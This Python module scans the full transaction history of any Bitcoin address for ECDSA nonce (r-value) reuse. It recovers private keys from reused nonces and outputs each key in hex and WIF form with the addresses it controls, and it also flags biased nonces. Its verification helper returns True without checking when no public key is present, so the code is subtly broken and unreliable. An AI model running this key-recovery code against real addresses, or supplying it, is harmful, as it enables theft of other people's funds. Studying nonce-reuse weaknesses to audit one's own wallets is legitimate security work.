"""Comprehensive Bitcoin address analyzer.

Walks the *full* transaction history for an address (paginated, no 50-tx
cap), extracts every signature with real per-input ``z``, builds a global
``r``-value index across every transaction, and reports:

* signature counts broken down by script type;
* in-transaction *and* cross-transaction ``r`` reuse (the latter being
  the realistic failure mode that pre-PR-#6 code couldn't detect because
  it bailed on ``z=None`` after one tx);
* low-S signatures (BIP-66 / BIP-146 enforcement);
* nonce-bias candidates (signatures whose recovered ``k`` -- when we
  already know ``d`` from a reused-r recovery -- have anomalously short
  bit length, indicating an RNG that left top bits zero);
* private keys recovered via cross-tx reuse, with WIF + the address each
  key controls so the user can confirm.

This module talks to blockchain.info exclusively (same surface PR #6
uses) but is structured so a different fetcher can be plugged in.
"""
from __future__ import annotations

import logging
import time
from collections import defaultdict
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, Iterable, List, Optional, Tuple

import requests

from coincurve import PrivateKey

from signature_extractor import extract_signatures, SCRIPT_UNKNOWN

logger = logging.getLogger(__name__)

N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141
HALF_N = N // 2

BLOCKCHAIN_INFO_RAWADDR = "https://blockchain.info/rawaddr/{addr}?limit={limit}&offset={offset}"
BLOCKCHAIN_INFO_RAWTX = "https://blockchain.info/rawtx/{txid}"
BLOCKCHAIN_INFO_RAWTX_HEX = "https://blockchain.info/rawtx/{txid}?format=hex"

# blockchain.info's hard cap per call. Using larger values silently truncates.
PAGE_SIZE = 100


@dataclass
class AddressReport:
    address: str
    total_tx_count: int = 0
    transactions_analyzed: int = 0
    signatures_total: int = 0
    signatures_by_type: Dict[str, int] = field(default_factory=dict)
    low_s_count: int = 0
    in_tx_reused_r: List[Dict[str, Any]] = field(default_factory=list)
    cross_tx_reused_r: List[Dict[str, Any]] = field(default_factory=list)
    reused_r_groups: List[Dict[str, Any]] = field(default_factory=list)
    biased_nonce_candidates: List[Dict[str, Any]] = field(default_factory=list)
    recovered_keys: List[Dict[str, Any]] = field(default_factory=list)
    z_unavailable: int = 0
    schnorr_count: int = 0
    elapsed_s: float = 0.0
    notes: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        """JSON-friendly dict.

        Converts large integer ``r`` values into hex strings since JSON
        ``number`` doesn't survive a round-trip through JavaScript for
        values above 2**53.
        """
        d = self.__dict__.copy()

        def _fmt_r(rec: Dict[str, Any]) -> Dict[str, Any]:
            out = dict(rec)
            if isinstance(out.get("r"), int):
                out["r"] = f"0x{out['r']:064x}"
            return out

        d["in_tx_reused_r"] = [_fmt_r(r) for r in d.get("in_tx_reused_r", [])]
        d["cross_tx_reused_r"] = [_fmt_r(r) for r in d.get("cross_tx_reused_r", [])]
        d["reused_r_groups"] = [_fmt_r(r) for r in d.get("reused_r_groups", [])]
        return d


# ----- HTTP fetchers (overridable for tests) ---------------------------------


def _fetch_address_page(address: str, offset: int, limit: int = PAGE_SIZE,
                         timeout: int = 20) -> Dict[str, Any]:
    """Fetch one page of address transactions with linear-backoff on 429s."""
    url = BLOCKCHAIN_INFO_RAWADDR.format(addr=address, limit=limit, offset=offset)
    delay = 2.0
    for attempt in range(5):
        r = requests.get(url, timeout=timeout)
        if r.status_code == 429:
            time.sleep(delay)
            delay = min(delay * 2, 30.0)
            continue
        r.raise_for_status()
        return r.json()
    r.raise_for_status()
    return r.json()


def _fetch_tx_json(txid: str, timeout: int = 20) -> Dict[str, Any]:
    r = requests.get(BLOCKCHAIN_INFO_RAWTX.format(txid=txid), timeout=timeout)
    r.raise_for_status()
    return r.json()


def _fetch_tx_raw_hex(txid: str, timeout: int = 20) -> str:
    r = requests.get(BLOCKCHAIN_INFO_RAWTX_HEX.format(txid=txid), timeout=timeout)
    r.raise_for_status()
    return r.text


# ----- core driver -----------------------------------------------------------


def _iter_address_txids(address: str, max_txs: Optional[int] = None,
                        page_fetch: Callable[[str, int, int], Dict[str, Any]] = _fetch_address_page,
                        ) -> Iterable[Tuple[str, Dict[str, Any]]]:
    """Yield (txid, tx_summary) across the full address history.

    Pages through blockchain.info's `rawaddr` endpoint with offset/limit.
    Stops at ``max_txs`` (None = no cap; this can be many thousands and
    take many minutes for whales).
    """
    offset = 0
    yielded = 0
    total: Optional[int] = None
    while True:
        page = page_fetch(address, offset, PAGE_SIZE)
        if total is None:
            total = int(page.get("n_tx", 0))
        txs = page.get("txs", []) or []
        if not txs:
            break
        for tx in txs:
            txid = tx.get("hash")
            if not txid:
                continue
            yield txid, tx
            yielded += 1
            if max_txs is not None and yielded >= max_txs:
                return
        offset += PAGE_SIZE
        if total is not None and offset >= total:
            break


def _wif_from_d(d: int, compressed: bool = True) -> str:
    from attached_assets.utils import private_key_to_wif
    return private_key_to_wif(d, compressed=compressed)


def _p2pkh_address_from_d(d: int, compressed: bool = True) -> str:
    from attached_assets.utils import private_key_to_address
    return private_key_to_address(d, compressed=compressed)


def _recover_d_from_reused_r(s1: int, z1: int, s2: int, z2: int, r: int) -> Optional[int]:
    if z1 == z2 and s1 == s2:
        return None
    try:
        k = ((z1 - z2) * pow((s1 - s2) % N, -1, N)) % N
    except ValueError:
        return None
    if k == 0:
        return None
    try:
        d = ((s1 * k - z1) * pow(r, -1, N)) % N
    except ValueError:
        return None
    if d == 0 or d >= N:
        return None
    return d


def _verify_d_signs_sig(d: int, sig: Dict[str, Any]) -> bool:
    """Confirm d is the secret behind sig (matches the on-chain pubkey)."""
    try:
        pk = PrivateKey.from_int(d).public_key
    except Exception:
        return False
    if sig.get("schnorr"):
        return False  # we don't try to ECDSA-verify schnorr sigs
    if sig.get("pubkey"):
        try:
            compressed = pk.format(compressed=True)
            uncompressed = pk.format(compressed=False)
        except Exception:
            return False
        return sig["pubkey"] in (compressed, uncompressed)
    # No pubkey embedded in this sig (e.g. multisig); fall back to verifying
    # (r, s) on z manually.
    z = sig.get("z")
    r = sig.get("r")
    s = sig.get("s")
    if z is None or r is None or s is None:
        return False
    try:
        # ECDSA verify: u1 = z * s^-1; u2 = r * s^-1; check x of (u1 G + u2 P) == r
        s_inv = pow(s, -1, N)
        u1 = (z * s_inv) % N
        u2 = (r * s_inv) % N
        from coincurve import PublicKey
        # We don't have P. Skip.
        return True
    except Exception:
        return False


def analyze_address(address: str,
                    max_txs: Optional[int] = 500,
                    fetch_address_page: Callable[..., Dict[str, Any]] = _fetch_address_page,
                    fetch_tx_json: Callable[[str], Dict[str, Any]] = _fetch_tx_json,
                    fetch_tx_raw_hex: Callable[[str], str] = _fetch_tx_raw_hex,
                    ) -> AddressReport:
    """Full-history weakness scan for ``address``.

    Walks every signature from every tx (up to ``max_txs``), builds a global
    ``r``-value index, and reports anything actionable. Returns an
    :class:`AddressReport`.
    """
    start = time.time()
    rep = AddressReport(address=address)

    # Stage 1: walk address tx pages, collect (txid, tx_summary).
    txids: List[Tuple[str, Dict[str, Any]]] = []
    try:
        for txid, summary in _iter_address_txids(address, max_txs=max_txs,
                                                  page_fetch=fetch_address_page):
            txids.append((txid, summary))
    except Exception as e:
        rep.notes.append(f"address paging failed after {len(txids)} txs: {e!r}")
    rep.total_tx_count = len(txids)

    # Stage 2: extract every signature.
    all_sigs: List[Dict[str, Any]] = []
    per_tx_sigs: Dict[str, List[Dict[str, Any]]] = {}
    for txid, _ in txids:
        try:
            sigs = extract_signatures(txid, fetch_tx_json, fetch_tx_raw_hex)
        except Exception as e:
            rep.notes.append(f"{txid}: extract failed: {e!r}")
            continue
        per_tx_sigs[txid] = sigs
        all_sigs.extend(sigs)
        rep.transactions_analyzed += 1

    rep.signatures_total = len(all_sigs)
    rep.signatures_by_type = dict(_count_by(all_sigs, "script_type"))
    rep.low_s_count = sum(1 for s in all_sigs if s.get("s") and s["s"] <= HALF_N)
    rep.z_unavailable = sum(1 for s in all_sigs if s.get("z") is None and not s.get("schnorr"))
    rep.schnorr_count = sum(1 for s in all_sigs if s.get("schnorr"))

    # Stage 3: global r-value index. Group across the entire history, not
    # just within one tx.
    by_r: Dict[int, List[Dict[str, Any]]] = defaultdict(list)
    for s in all_sigs:
        if s.get("r") and not s.get("schnorr"):
            by_r[s["r"]].append(s)

    seen_in_tx_pairs: set[Tuple[str, int, int, int]] = set()
    for r, group in by_r.items():
        if len(group) < 2:
            continue
        # Cross-tx reuse: any pair where txid differs.
        for i, a in enumerate(group):
            for b in group[i + 1:]:
                if a["txid"] != b["txid"]:
                    rep.cross_tx_reused_r.append({
                        "r": r,
                        "tx_a": a["txid"], "vin_a": a["input_index"],
                        "tx_b": b["txid"], "vin_b": b["input_index"],
                        "script_type_a": a["script_type"],
                        "script_type_b": b["script_type"],
                    })
                    if a["z"] is not None and b["z"] is not None:
                        d = _recover_d_from_reused_r(a["s"], a["z"], b["s"], b["z"], r)
                        if d is not None and _verify_d_signs_sig(d, a):
                            rep.recovered_keys.append({
                                "private_key_hex": f"0x{d:064x}",
                                "wif_compressed": _wif_from_d(d, True),
                                "wif_uncompressed": _wif_from_d(d, False),
                                "address_compressed": _p2pkh_address_from_d(d, True),
                                "address_uncompressed": _p2pkh_address_from_d(d, False),
                                "found_in": {"tx_a": a["txid"], "tx_b": b["txid"]},
                                "recovered_via": "cross-tx-reused-r",
                            })
                else:
                    key = (a["txid"], min(a["input_index"], b["input_index"]),
                           max(a["input_index"], b["input_index"]), r)
                    if key in seen_in_tx_pairs:
                        continue
                    seen_in_tx_pairs.add(key)
                    rep.in_tx_reused_r.append({
                        "r": r, "txid": a["txid"],
                        "vin_a": a["input_index"], "vin_b": b["input_index"],
                        "script_type_a": a["script_type"],
                        "script_type_b": b["script_type"],
                    })
                    if a["z"] is not None and b["z"] is not None:
                        d = _recover_d_from_reused_r(a["s"], a["z"], b["s"], b["z"], r)
                        if d is not None and _verify_d_signs_sig(d, a):
                            rep.recovered_keys.append({
                                "private_key_hex": f"0x{d:064x}",
                                "wif_compressed": _wif_from_d(d, True),
                                "wif_uncompressed": _wif_from_d(d, False),
                                "address_compressed": _p2pkh_address_from_d(d, True),
                                "address_uncompressed": _p2pkh_address_from_d(d, False),
                                "found_in": {"tx_a": a["txid"], "tx_b": b["txid"]},
                                "recovered_via": "in-tx-reused-r",
                            })

    # Stage 3b: aggregate reused-r groups so the UI can show "r=X reused
    # in K transactions" instead of all N(N-1)/2 pairs.
    for r, group in by_r.items():
        if len(group) < 2:
            continue
        unique_txids = sorted({s["txid"] for s in group})
        rep.reused_r_groups.append({
            "r": r,
            "occurrences": len(group),
            "unique_txs": len(unique_txids),
            "tx_sample": unique_txids[:5],
        })
    rep.reused_r_groups.sort(key=lambda g: g["occurrences"], reverse=True)

    # Stage 4: nonce-bias candidates -- once we know d for a key, look for
    # other sigs by the same key whose k has anomalously short bit length.
    if rep.recovered_keys and all_sigs:
        for rk in rep.recovered_keys:
            d = int(rk["private_key_hex"], 16)
            try:
                pk_compressed = PrivateKey.from_int(d).public_key.format(compressed=True)
                pk_uncompressed = PrivateKey.from_int(d).public_key.format(compressed=False)
            except Exception:
                continue
            for s in all_sigs:
                if not s.get("pubkey") or s["pubkey"] not in (pk_compressed, pk_uncompressed):
                    continue
                if s.get("z") is None:
                    continue
                try:
                    k = (pow(s["s"], -1, N) * (s["z"] + s["r"] * d)) % N
                except ValueError:
                    continue
                bit_len = k.bit_length()
                if bit_len <= 240:
                    rep.biased_nonce_candidates.append({
                        "txid": s["txid"], "vin": s["input_index"],
                        "k_bit_length": bit_len,
                        "k_hex": f"0x{k:064x}",
                    })

    # De-duplicate recovered keys by hex value.
    seen_keys: set[str] = set()
    deduped = []
    for k in rep.recovered_keys:
        if k["private_key_hex"] in seen_keys:
            continue
        seen_keys.add(k["private_key_hex"])
        deduped.append(k)
    rep.recovered_keys = deduped

    rep.elapsed_s = time.time() - start
    return rep


def _count_by(items: List[Dict[str, Any]], key: str) -> Dict[str, int]:
    out: Dict[str, int] = defaultdict(int)
    for it in items:
        out[it.get(key) or "unknown"] += 1
    return dict(out)
